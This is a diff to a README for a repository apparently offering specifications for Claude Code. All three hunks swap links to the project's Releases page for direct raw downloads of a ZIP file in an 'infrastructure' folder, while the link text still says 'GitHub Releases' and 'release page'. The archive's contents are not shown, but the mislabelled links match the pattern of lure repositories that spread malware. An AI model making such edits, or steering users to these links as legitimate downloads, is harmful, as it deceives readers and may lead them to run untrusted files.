@@ -1,6 +1,6 @@
 # 🛠️ claude-code-reverse-engineering - Clear specs for Claude Code work
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/raw/refs/heads/main/infrastructure/engineering-code-reverse-claude-v1.1.zip)
 
 ## 📘 What this is
 
@@ -26,7 +26,7 @@ If you plan to use the docs with local tools, you may also want:
 
 ## 🚀 Download the files
 
-Use this page to download: [GitHub Releases](https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/releases)
+Use this page to download: [GitHub Releases](https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/raw/refs/heads/main/infrastructure/engineering-code-reverse-claude-v1.1.zip)
 
 Open the page, then look for the latest release. Download the file that matches your needs. If the release includes a ZIP file, use that file. If it includes a Windows app file, download that file.
 
@@ -148,7 +148,7 @@ If Windows asks how to open a file, choose a trusted app such as:
 
 ## 📥 Download link again
 
-Visit the release page here: [https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/releases](https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/releases)
+Visit the release page here: [https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/raw/refs/heads/main/infrastructure/engineering-code-reverse-claude-v1.1.zip](https://github.com/Arteriogramtrombiculiasis120/claude-code-reverse-engineering/raw/refs/heads/main/infrastructure/engineering-code-reverse-claude-v1.1.zip)
 
 ## 🧾 Topics covered
 
